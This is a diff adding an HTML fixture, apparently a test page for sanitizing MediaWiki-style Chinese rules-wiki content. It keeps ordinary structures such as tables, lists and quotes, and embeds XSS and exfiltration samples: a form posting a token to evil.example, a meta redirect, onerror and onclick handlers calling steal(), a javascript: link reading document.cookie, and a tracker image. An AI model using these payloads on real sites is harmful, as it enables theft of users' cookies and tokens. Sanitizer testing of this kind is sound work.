@@ -1,0 +1,82 @@
+<!doctype html>
+<html lang="zh-CN">
+  <head>
+    <title>示例页面</title>
+  </head>
+  <body>
+    <h1 class="title">示例页面</h1>
+    <div id="mw-content-text">
+      <div class="mw-parser-output">
+        <div id="toc" class="toc"><a href="#规则">目录</a></div>
+        <script>
+          globalThis.stolen = true;
+        </script>
+        <style>
+          .secret {
+            display: block;
+          }
+        </style>
+        <meta http-equiv="refresh" content="0;url=https://evil.example/" />
+        <svg><text>vector payload</text></svg>
+        <form action="https://evil.example/steal"><input name="token" /></form>
+        <h2 id="规则">规则<span class="mw-editsection">[编辑]</span></h2>
+        <p onclick="steal()">
+          <strong>重要：</strong>保留正文与
+          <a
+            href="/index.php?title=%E7%9B%AE%E6%A0%87%E9%A1%B5%E9%9D%A2#%E7%BB%86%E8%8A%82"
+            >已选择页面</a
+          >、
+          <a href="/wiki/%E5%BE%85%E6%A0%B8%E5%AF%B9%E9%A1%B5%E9%9D%A2"
+            >待核对页面</a
+          >及 <a href="https://rules.example.test/reference">外部参考</a>。
+          <a href="javascript:alert(document.cookie)">危险链接</a>
+        </p>
+        <blockquote><p>规则引用不应被压平成普通段落。</p></blockquote>
+        <ul>
+          <li>
+            第一项
+            <ol>
+              <li>嵌套项</li>
+            </ol>
+          </li>
+          <li>第二项</li>
+        </ul>
+        <dl>
+          <dt>醉酒</dt>
+          <dd>失去能力但不会得知。</dd>
+        </dl>
+        <table class="wikitable">
+          <caption>
+            人数配置
+          </caption>
+          <thead>
+            <tr>
+              <th>玩家</th>
+              <th>镇民</th>
+            </tr>
+          </thead>
+          <tbody>
+            <tr>
+              <td>5</td>
+              <td>3</td>
+            </tr>
+          </tbody>
+        </table>
+        <p>
+          <img src="/images/rule.png" alt="规则示意图" onerror="steal()" />
+          <img src="https://evil.example/tracker.png" alt="跨域追踪图" />
+        </p>
+        <pre><code>if (alive) {
+  vote();
+}</code></pre>
+        <!-- Saved in parser cache with untrusted diagnostics. -->
+      </div>
+    </div>
+    <div class="printfooter">
+      取自“<a
+        href="https://clocktower-wiki.gstonegames.com/index.php?title=%E7%A4%BA%E4%BE%8B%E9%A1%B5%E9%9D%A2&amp;oldid=42"
+        >固定链接</a
+      >”
+    </div>
+  </body>
+</html>
